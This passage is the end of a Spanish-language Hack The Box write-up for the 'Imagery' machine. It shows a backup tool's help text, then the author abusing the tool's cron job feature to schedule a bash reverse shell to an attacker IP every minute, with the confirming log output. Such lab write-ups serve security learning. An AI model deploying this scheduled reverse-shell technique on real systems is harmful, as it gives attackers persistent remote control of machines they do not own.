          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)

    auto list
      Purpose: List all automated jobs managed by Charcol.
      Example:
        auto list

    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as 'auto add'.
      Example:
        auto edit <job_id> --schedule "30 4 * * *" --name "Updated Backup Job"

    auto delete <job_id>
      Purpose: Remove an automated job managed by Charcol.
      Verification: Same as 'auto add'.
      Example:
        auto delete <job_id>

  Shell & Help:
    shell
      Purpose: Enter this interactive Charcol shell.
      Example:
        shell

    exit
      Purpose: Exit the Charcol shell.
      Example:
        exit

    clear
      Purpose: Clear the interactive shell screen.
      Example:
        clear

    help [command]
      Purpose: Show help for Charcol or a specific command.
      Example:
        help backup

Global Flags (apply to all commands unless overridden):
  --app-password <password>    : Provide the Charcol *application password* directly. Required for 'auto' commands if status 1. Less secure than interactive prompt.
  -p, "--password" <password>    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.
  -v, "--verbose"                : Enable verbose output.
  --quiet                      : Suppress informational output (show only warnings and errors).
  --log-file <path>            : Log all output to a specified file.
  --dry-run                    : Simulate actions without actual file changes (for 'backup' and 'fetch').
  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.
  --no-banner                   : Do not display the ASCII banner.
  -R, "--reset-password-to-default"  : Reset application password to default (requires system password verification).
```

Esta herramienta sirve para encriptar archivos como el que desciframos... zip.aes.

Luego de leer y analizar el tutorial de esta herramienta, note que la Automated Jobs (Cron) permite correr --command para programar el comando de respaldo. En lugar del comando de respaldo, puedo agregar una "revershell" aquí.

El comando es el siguiente, con --schedule para establecer el tiempo de ejecución del comando, --command el comando que se va a ejecutar y --name para nombrar este trabajo, finalmente agregue la IP de la maquina Kali y el puerto opcional.

```bash
auto add --schedule "* * * * *" --command "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/443 0>&1'" --name "test"
```

Este comando lo va a ejecutar cada minuto asi que tenemos tiempo para ponernos en escucha.

```bash
charcol> auto add --schedule "* * * * *" --command "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/443 0>&1'" --name "test"
[2025-10-27 15:49:38] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-27 15:49:44] [INFO] System password verified successfully.
[2025-10-27 15:49:44] [INFO] Auto job 'test' (ID: e2e5843e-2e6f-4add-9e4f-4a9993c573da) added successfully. The job will run according to schedule.
[2025-10-27 15:49:44] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/443 0>&1'
```

![](htb-writeup-imagery/imagery37.png)

Eso seria todo por la maquina Imagery de Hack The Box. GRACIAS!!!!!!!
 






























